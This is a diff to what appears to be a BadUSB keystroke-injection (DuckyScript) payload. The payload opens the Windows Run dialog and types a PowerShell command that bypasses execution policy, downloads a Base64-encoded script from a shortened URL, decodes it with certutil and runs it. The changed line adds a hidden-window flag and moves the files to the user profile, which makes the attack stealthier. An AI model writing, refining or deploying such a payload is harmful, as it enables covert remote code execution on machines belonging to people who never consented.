@@ -2,7 +2,7 @@ REM default password is "pass" - downloaded Base64 encoded powershell script whi
 DELAY 1000
 GUI r
 DELAY 1000
-STRING powershell -NoP -Ep Bypass irm t.ly/Xe_Uf|sc "C:\Users\$env:USERNAME\Desktop\e.txt";certutil -f -decode "C:\Users\$env:USERNAME\Desktop\e.txt" "C:\Users\$env:USERNAME\Desktop\d.ps1";iex "C:\Users\$env:USERNAME\Desktop\d.ps1"
+STRING powershell -NoP -W H -Ep Bypass irm t.ly/Xe_Uf -O $env:USERPROFILE\e.txt;certutil -f -decode $env:USERPROFILE\e.txt $env:USERPROFILE\d.ps1;iex $env:USERPROFILE\d.ps1
 DELAY 1000
 ENTER
 
